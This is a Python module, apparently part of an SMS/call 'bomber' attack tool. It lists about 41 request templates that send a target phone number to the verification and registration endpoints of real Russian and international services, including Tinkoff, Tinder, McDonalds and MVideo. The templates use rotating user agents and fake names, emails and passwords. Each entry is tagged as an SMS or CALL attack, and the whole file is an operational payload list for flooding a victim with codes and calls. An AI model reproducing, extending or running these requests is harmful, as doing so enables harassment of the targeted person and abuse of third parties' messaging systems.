from Core.Attack.Tools.User_Agent import user_agent

def extra_urls(number):
    """
    41 SMS-сервисов из b0mb3r-master
    """
    return [
        # Aramba
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Aramba.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'http://www.aramba.ru/core.php',
            'headers': user_agent()[0],
            'data': {'act': 'codeRequest', 'phone': '+' + number, 'l': 'user', 'p': 'user', 'name': 'user', 'email': 'user@gmail.com'},
        },
        # BelkaCar
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'BelkaCar.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://belkacar.ru/get-confirmation-code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Citilink (phone in URL)
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Citilink.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.citilink.ru/registration/confirm/phone/+' + number + '/',
            'headers': user_agent()[0],
            'data': {},
        },
        # DoZarplati
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'DoZarplati.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://online-api.dozarplati.com/rpc',
            'headers': user_agent()[0],
            'json': {'id': 1, 'jsonrpc': '2.0', 'method': 'auth.login', 'params': {'phoneNumber': number}},
        },
        # DrugVokrug
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'DrugVokrug.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://drugvokrug.ru/siteActions/processSms.htm',
            'headers': user_agent()[0],
            'data': {'cell': number},
        },
        # GorZdrav
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'GorZdrav.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://gorzdrav.org/login/register/sms/send',
            'headers': user_agent()[0],
            'data': {'phone': number[1:4] + ') ' + number[4:7] + '-' + number[7:9] + '-' + number[9:11]},
        },
        # Grab
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Grab.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
            'headers': user_agent()[0],
            'data': {'phoneNumber': number, 'countryCode': number[0], 'name': 'User', 'email': 'user@gmail.com'},
        },
        # IQOS
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'IQOS.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://ube.pmsm.org.ru/esb/iqos-reg/submission',
            'headers': user_agent()[0],
            'json': {'data': {'firstName': 'User', 'lastName': 'Ivanov', 'phone': number, 'email': 'user@gmail.com', 'password': 'user123', 'passwordConfirm': 'user123'}},
        },
        # Karusel
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Karusel.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://app.karusel.ru/api/v1/phone/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Lenta
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Lenta.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://lenta.com/api/v1/authentication/requestValidationCode',
            'headers': user_agent()[0],
            'json': {'phone': '+' + number},
        },
        # Maxidom
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Maxidom.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://www.maxidom.ru/ajax/doRegister.php',
            'headers': user_agent()[0],
            'params': {'send_code_again': 'Y', 'phone': '8(' + number[1:4] + ')' + number[4:7] + '-' + number[7:9] + '-' + number[9:11], 'email': 'user@user.com', 'code_type': 'phone'},
        },
        # McDonalds
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'McDonalds.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://mcdonalds.ru/api/auth/code',
            'headers': user_agent()[0],
            'json': {'phone': '+' + number},
        },
        # MisterCat
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'MisterCat.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://mistercat.com.ua/index.php',
            'headers': user_agent()[0],
            'params': {'option': 'com_ksenmart', 'view': 'profile', 'task': 'profile.sms_auth', 'tmpl': 'ksenmart'},
            'data': {'phone': number, 'type': 'send'},
        },
        # MTS TV
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'MTS TV', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.mtstv.ru/v1/users',
            'headers': user_agent()[0],
            'data': {'msisdn': number},
        },
        # MVideo
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'MVideo.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
            'headers': user_agent()[0],
            'params': {'pageName': 'registerPrivateUserPhoneVerification'},
            'data': {'phone': number[1:4] + '-' + number[4:-1]},
        },
        # NewNext
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'NewNext.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://newnext.ru/graphql',
            'headers': user_agent()[0],
            'json': {
                'operationName': 'registration',
                'variables': {'client': {'firstName': 'Ivan', 'lastName': 'Ivanov', 'phone': number, 'typeKeys': ['Unemployed']}},
                'query': 'mutation registration($client: ClientInput!) { registration(client: $client) { token __typename } }',
            },
        },
        # Optima (Украина)
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Optima.Taxi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://online.optima.taxi/user/get-code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Ostin
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Ostin.com', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp',
            'headers': user_agent()[0],
            'params': {'type': 'sendConfirmCode', 'phoneNumber': ' ' + number[0] + ' (' + number[1:4] + ')' + number[4:7] + '-' + number[7:9] + '-' + number[9:11]},
        },
        # OyoRooms
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'OyoRooms.com', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://www.oyorooms.com/api/pwa/generateotp',
            'headers': user_agent()[0],
            'params': {'phone': number[1:], 'country_code': '+' + number},
        },
        # PrivetMir
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'PrivetMir.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api-user.privetmir.ru/api/send-code',
            'headers': user_agent()[0],
            'data': {'approve1': 'on', 'approve2': 'on', 'checkApproves': 'Y', 'checkExist': 'Y', 'login': '+' + number[0] + ' (' + number[1:4] + ')' + number[4:7] + '-' + number[7:9] + '-' + number[9:11], 'scope': 'register-user'},
        },
        # PSWallet
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'PSWallet.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://api.pswallet.ru/system/smsCode',
            'headers': user_agent()[0],
            'params': {'mobile': number, 'type': '0'},
        },
        # Rabota.ru
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Rabota.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.rabota.ru/remind',
            'headers': user_agent()[0],
            'data': {'credential': number},
        },
        # RuTaxi
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'RuTaxi.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://moscow.rutaxi.ru/ajax_keycode.html',
            'headers': user_agent()[0],
            'data': {'1': number},
        },
        # RuTube
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'RuTube.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://rutube.ru/api/accounts/sendpass/phone',
            'headers': user_agent()[0],
            'data': {'phone': '+' + number},
        },
        # S7 Airlines
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'S7.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://www.s7.ru/dotCMS/priority/ajaxEnrollment',
            'headers': user_agent()[0],
            'params': {'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': number[0], 'mobilePhone.areaCode': number[1:4], 'mobilePhone.localNumber': number[4:-1]},
        },
        # SMSint
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'SMSint.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
            'headers': user_agent()[0],
            'data': {'name': 'User', 'phone': number},
        },
        # Sunlight
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sunlight.net', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.sunlight.net/v3/customers/authorization/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Tanuki
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Tanuki.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.tanuki.ru/...',
            'headers': user_agent()[0],
            'data': {'phone': number, 'password': '12345', 'yt0': 'Регистрация'},
        },
        # TaxiSeven
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'TaxiSeven.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'http://taxiseven.ru/auth/register',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Tinder
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Tinder.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
            'headers': user_agent()[0],
            'data': {'phone_number': number},
        },
        # Tinkoff
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Tinkoff.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.tinkoff.ru/v1/sign_up',
            'headers': user_agent()[0],
            'data': {'phone': '+' + number},
        },
        # TotoPizza
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'TotoPizza.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://totopizza.ru/gus-crystal/',
            'headers': user_agent()[0],
            'data': {'PHONE': '+' + number[0] + ' (' + number[1:4] + ') ' + number[4:7] + '-' + number[7:9] + '-' + number[9:11], 'AUTH_FORM': 'Y', 'LOGIN': 'Продолжить'},
        },
        # URAMobil
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'URAMobil.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://service.uramobil.ru/profile/smstoken',
            'headers': user_agent()[0],
            'data': {'PhoneNumber': number},
        },
        # VoxImplant
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'VoxImplant.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api-ru-manage.voximplant.com/api/SendActivationCode',
            'headers': user_agent()[0],
            'data': {'phone': number, 'account_email': 'user@gmail.com'},
        },
        # WiFi-Metro
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'WiFi-Metro.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://cabinet.wi-fi.ru/api/auth/by-sms',
            'headers': {'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36', 'App-ID': 'cabinet'},
            'data': {'msisdn': number},
        },
        # Worki
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Worki.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.iconjob.co/api/web/v1/verification_code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # YouDrive
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'YouDrive.today', 'anonymous': 'No'},
            'method': 'post',
            'url': 'http://youdrive.today/signup/phone',
            'headers': user_agent()[0],
            'data': {'phone': number[1:], 'phone_code': number[0]},
        },
        # Youla
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Youla.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://youla.ru/web-api/auth/request_code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
    
        # FastMoney
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'FastMoney.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://fastmoney.ru/auth/registration',
            'headers': user_agent()[0],
            'data': {'RegistrationForm[username]': '+' + number, 'RegistrationForm[password]': '12345', 'RegistrationForm[confirmPassword]': '12345', 'yt0': 'Регистрация'},
        },
        # Denga (звонок!)
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Denga.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://online.denga.ru/admin/api/json/registration',
            'headers': user_agent()[0],
            'data': {'phone': number, 'email': 'user@gmail.com', 'password': '12345678', 'passwordConfirmation': '12345678'},
        },
        # FindClone (звонок!)
        {
            'info': {'country': 'ALL', 'attack': 'CALL', 'website': 'FindClone.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://findclone.ru/register',
            'headers': user_agent()[0],
            'params': {'phone': '+' + number},
        },
    ]
